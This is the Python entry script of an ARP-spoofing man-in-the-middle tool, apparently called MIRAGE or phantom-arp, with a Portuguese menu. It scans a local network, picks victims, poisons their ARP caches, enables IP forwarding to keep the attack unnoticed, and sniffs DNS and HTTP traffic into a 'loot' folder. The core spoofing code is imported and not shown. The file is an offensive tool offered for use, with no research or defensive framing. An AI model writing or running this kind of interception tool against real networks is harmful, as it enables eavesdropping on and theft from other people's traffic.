#!/usr/bin/env python3
import os
import sys
import time
from colorama import Fore, Style, init

init(autoreset=True)

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.utils import log, save_log, get_default_interface, get_gateway_ip, get_local_ip, BANNER
from core.network import scan_hosts
from core.spoofer import ARPSpoofer


# ------------------------------------------------------------------ #
#  HELPERS                                                            #
# ------------------------------------------------------------------ #

def clear():
    os.system("cls" if os.name == "nt" else "clear")


def pause():
    input(f"\n{Fore.WHITE}  Pressione ENTER para continuar...{Style.RESET_ALL}")


def print_menu(iface, gateway, local_ip, spoofer):
    active    = sum(1 for d in spoofer.list_targets().values() if d["active"])
    sniffing  = f"{Fore.GREEN}✅ Ativa{Style.RESET_ALL}"   if spoofer.sniffing        else f"{Fore.RED}❌ Inativa{Style.RESET_ALL}"
    forwarding = f"{Fore.GREEN}✅ ON{Style.RESET_ALL}"     if spoofer.check_forwarding() else f"{Fore.RED}❌ OFF{Style.RESET_ALL}"
    stats     = spoofer.get_stats()

    print(f"""
{Fore.RED}  ┌─────────────────────────────────────────┐
  │           MIRAGE  — ARP SPOOFER         │
  └─────────────────────────────────────────┘{Style.RESET_ALL}

{Fore.CYAN}  Interface    : {Fore.WHITE}{iface}
{Fore.CYAN}  Local IP     : {Fore.WHITE}{local_ip}
{Fore.CYAN}  Gateway      : {Fore.WHITE}{gateway}
{Fore.CYAN}  Alvos ativos : {Fore.WHITE}{active}
{Fore.CYAN}  Captura      : {sniffing}
{Fore.CYAN}  IP Forward   : {forwarding}
{Fore.CYAN}  Pacotes      : {Fore.WHITE}{stats['pkts']}  {Fore.CYAN}DNS: {Fore.WHITE}{stats['dns']}  {Fore.CYAN}HTTP: {Fore.WHITE}{stats['urls']}
{Style.RESET_ALL}
{Fore.YELLOW}  [1]{Fore.WHITE} Escanear hosts na rede
{Fore.YELLOW}  [2]{Fore.WHITE} Adicionar alvo
{Fore.YELLOW}  [3]{Fore.WHITE} Remover alvo
{Fore.YELLOW}  [4]{Fore.WHITE} Listar alvos ativos
{Fore.YELLOW}  [5]{Fore.WHITE} Iniciar captura de tráfego
{Fore.YELLOW}  [6]{Fore.WHITE} Parar captura de tráfego
{Fore.YELLOW}  [7]{Fore.WHITE} Ativar / Desativar IP forwarding
{Fore.YELLOW}  [8]{Fore.WHITE} Encerrar todos os ataques
{Fore.YELLOW}  [0]{Fore.WHITE} Sair
""")


def print_hosts(hosts, gateway):
    if not hosts:
        log("Nenhum host encontrado.", "warning")
        return

    print(f"\n{Fore.CYAN}  {'#':<5} {'IP':<18} {'MAC':<20} {'NOTA'}{Style.RESET_ALL}")
    print(f"  {'─'*55}")

    for i, h in enumerate(hosts, 1):
        note = f"{Fore.RED}[GATEWAY]{Style.RESET_ALL}" if h["ip"] == gateway else ""
        print(f"  {Fore.YELLOW}{i:<5}{Style.RESET_ALL} {h['ip']:<18} {h['mac']:<20} {note}")

    print()


# ------------------------------------------------------------------ #
#  MENU ACTIONS                                                       #
# ------------------------------------------------------------------ #

def action_scan(iface, gateway):
    clear()
    log("Iniciando scan de hosts...", "info")
    hosts = scan_hosts(iface)
    print_hosts(hosts, gateway)
    if hosts:
        log(f"{len(hosts)} host(s) encontrado(s).", "success")
    pause()
    return hosts


def action_add_target(spoofer, hosts, gateway):
    clear()
    if not hosts:
        log("Faça um scan primeiro (opção 1).", "warning")
        pause()
        return

    print_hosts(hosts, gateway)

    try:
        choice = input(f"{Fore.YELLOW}  Número do alvo (ou IP manual): {Style.RESET_ALL}").strip()

        if choice.isdigit() and 1 <= int(choice) <= len(hosts):
            target_ip = hosts[int(choice) - 1]["ip"]
        else:
            target_ip = choice

        if target_ip == gateway:
            log("Não é possível atacar o próprio gateway.", "error")
            pause()
            return

        spoofer.add_target(target_ip)
        save_log(f"TARGET ADDED | {target_ip}")

        # Lembra o usuário sobre IP forwarding
        if not spoofer.check_forwarding():
            log("⚠️  IP forwarding está OFF — vítima pode perder internet! Use opção [7].", "warning")

    except KeyboardInterrupt:
        pass

    pause()


def action_remove_target(spoofer):
    clear()
    targets = spoofer.list_targets()

    if not targets:
        log("Nenhum alvo ativo.", "warning")
        pause()
        return

    print(f"\n{Fore.CYAN}  {'#':<5} {'IP':<18} {'MAC':<20} {'STATUS'}{Style.RESET_ALL}")
    print(f"  {'─'*55}")

    ips = list(targets.keys())
    for i, ip in enumerate(ips, 1):
        d      = targets[ip]
        status = f"{Fore.GREEN}ATIVO{Style.RESET_ALL}" if d["active"] else f"{Fore.RED}PARADO{Style.RESET_ALL}"
        print(f"  {Fore.YELLOW}{i:<5}{Style.RESET_ALL} {ip:<18} {d['mac']:<20} {status}")

    print()

    try:
        choice = input(f"{Fore.YELLOW}  Número do alvo para remover: {Style.RESET_ALL}").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(ips):
            spoofer.remove_target(ips[int(choice) - 1])
    except KeyboardInterrupt:
        pass

    pause()


def action_list_targets(spoofer):
    clear()
    targets = spoofer.list_targets()

    if not targets:
        log("Nenhum alvo cadastrado.", "warning")
        pause()
        return

    print(f"\n{Fore.CYAN}  {'IP':<18} {'MAC':<20} {'STATUS'}{Style.RESET_ALL}")
    print(f"  {'─'*50}")

    for ip, d in targets.items():
        status = f"{Fore.GREEN}ATIVO{Style.RESET_ALL}" if d["active"] else f"{Fore.RED}PARADO{Style.RESET_ALL}"
        print(f"  {ip:<18} {d['mac']:<20} {status}")

    print()
    pause()


def action_toggle_forwarding(spoofer):
    clear()
    if spoofer.check_forwarding():
        spoofer.disable_forwarding()
    else:
        spoofer.enable_forwarding()
    pause()


# ------------------------------------------------------------------ #
#  MAIN                                                               #
# ------------------------------------------------------------------ #

def main():
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] Execute como root (sudo python3 phantom_arp.py){Style.RESET_ALL}")
        sys.exit(1)

    os.makedirs("loot", exist_ok=True)

    clear()
    print(BANNER)
    time.sleep(0.5)

    iface = get_default_interface()
    if not iface:
        log("Interface de rede não detectada.", "error")
        sys.exit(1)

    gateway = get_gateway_ip(iface)
    if not gateway:
        log("Gateway não detectado.", "error")
        sys.exit(1)

    local_ip = get_local_ip(iface)

    log(f"Interface : {iface}", "success")
    log(f"Gateway   : {gateway}", "success")
    log(f"Local IP  : {local_ip}", "success")

    spoofer = ARPSpoofer(iface=iface, gateway_ip=gateway)
    save_log(f"SESSION START | iface={iface} gateway={gateway} local={local_ip}")

    # Avisa se IP forwarding está desativado
    if not spoofer.check_forwarding():
        log("⚠️  IP forwarding está OFF. Ative com opção [7] antes de atacar.", "warning")

    hosts = []
    time.sleep(1)

    while True:
        clear()
        print_menu(iface, gateway, local_ip, spoofer)

        try:
            opt = input(f"{Fore.YELLOW}  phantom-arp > {Style.RESET_ALL}").strip()
        except KeyboardInterrupt:
            opt = "0"

        if opt == "1":
            hosts = action_scan(iface, gateway)

        elif opt == "2":
            action_add_target(spoofer, hosts, gateway)

        elif opt == "3":
            action_remove_target(spoofer)

        elif opt == "4":
            action_list_targets(spoofer)

        elif opt == "5":
            spoofer.start_sniffing()
            pause()

        elif opt == "6":
            spoofer.stop_sniffing()
            pause()

        elif opt == "7":
            action_toggle_forwarding(spoofer)

        elif opt == "8":
            clear()
            log("Encerrando todos os ataques...", "warning")
            spoofer.stop_sniffing()
            spoofer.restore_all()
            save_log("SESSION END | todos os ataques encerrados")
            pause()

        elif opt == "0":
            clear()
            log("Encerrando e restaurando ARPs...", "warning")
            spoofer.stop_sniffing()
            spoofer.restore_all()
            save_log("SESSION END | saída pelo menu")
            log("Até logo!", "success")
            sys.exit(0)


if __name__ == "__main__":
    main()
